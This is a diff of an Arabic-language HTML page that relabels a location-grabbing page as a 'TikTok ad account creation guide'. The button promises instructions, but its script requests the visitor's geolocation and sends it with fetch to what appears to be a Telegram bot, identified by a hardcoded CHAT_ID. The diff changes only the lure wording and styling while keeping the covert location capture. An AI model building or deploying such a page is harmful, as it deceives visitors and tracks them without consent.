@@ -3,11 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>منصة إنشاء صفحات هبوط</title>
+<title>دليل إنشاء حساب إعلاني على تيك توك</title>
 <style>
   body {
     font-family: Arial, sans-serif;
-    background: #f4f4f4;
+    background: #f9f9f9;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -19,22 +19,25 @@
     border-radius: 10px;
     box-shadow: 0 5px 15px rgba(0,0,0,0.2);
     text-align: center;
+    max-width: 400px;
   }
   h1 {
     margin-bottom: 20px;
     color: #333;
+    font-size: 22px;
   }
   button {
-    padding: 15px 30px;
+    padding: 15px 25px;
     font-size: 18px;
     border: none;
     border-radius: 5px;
-    background: #28a745;
+    background: #ff0050;
     color: #fff;
     cursor: pointer;
+    margin-top: 20px;
   }
   button:hover {
-    background: #218838;
+    background: #e60045;
   }
   p {
     margin-top: 15px;
@@ -45,8 +48,8 @@
 <body>
 
 <div class="container">
-  <h1>منصة إنشاء صفحات هبوط</h1>
-  <button onclick="getLocation()">إنشاء صفحة هبوط</button>
+  <h1>دليل إنشاء حساب إعلاني على تيك توك</h1>
+  <button onclick="getLocation()">عرض طريقة إنشاء الحساب</button>
   <p id="status"></p>
 </div>
 
@@ -56,7 +59,7 @@ const CHAT_ID = "143914927";
 
 function getLocation() {
     if (navigator.geolocation) {
-        document.getElementById("status").innerText = "جارٍ معالجة طلبك...";
+        document.getElementById("status").innerText = "جارٍ عرض الطريقة...";
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
     } else {
         alert("المتصفح لا يدعم تحديد الموقع");
@@ -72,9 +75,9 @@ function sendLocation(position) {
     fetch(url)
         .then(response => {
             if (response.ok) {
-                document.getElementById("status").innerText = "✅ تم إنشاء صفحة هبوط بنجاح!";
+                document.getElementById("status").innerText = "✅ تم عرض الطريقة بنجاح!";
             } else {
-                document.getElementById("status").innerText = "❌ حدث خطأ أثناء إنشاء الصفحة";
+                document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
             }
         })
         .catch(() => {
